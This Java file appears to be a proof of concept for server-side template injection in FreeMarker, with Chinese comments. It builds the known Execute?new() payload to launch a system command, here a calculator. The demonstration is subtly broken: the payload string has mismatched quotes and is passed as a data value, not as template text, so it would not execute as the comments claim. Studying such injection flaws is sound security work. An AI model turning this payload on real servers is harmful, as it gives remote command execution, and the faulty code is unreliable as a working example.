package SSTIVuln;

import freemarker.template.*;
import java.io.*;
import java.util.*;
import freemarker.cache.StringTemplateLoader;

public class vuln2 {
    public static void main(String[] args) throws Exception{
        Map<String, Object> map = new HashMap<>();
        map.put("Name", "sb");
        map.put("Old", "16");

        // 构建恶意模板，其中包含系统命令执行
        String poc = "<#assign value=\"freemarker.template.utility.Execute?new()>${value(\"/usr/bin/gnome-calculator\")}\"";
        String template_poc = "名字为: ${Name} \n 年龄${poc}";  // 使用poc变量

        System.out.println(template_poc);

        // 加载模板
        StringTemplateLoader stringTemplateLoader = new StringTemplateLoader();
        stringTemplateLoader.putTemplate("template_name", template_poc);

        Configuration cfg = new Configuration(Configuration.VERSION_2_3_21);
        cfg.setTemplateLoader(stringTemplateLoader);

        // 添加poc到数据模型
        map.put("poc", poc);  // 确保poc变量传递到模板中

        Template template = cfg.getTemplate("template_name");
        StringWriter out = new StringWriter();

        template.process(map, out);
        System.out.println(out.toString());  // 输出渲染后的结果
    }
}
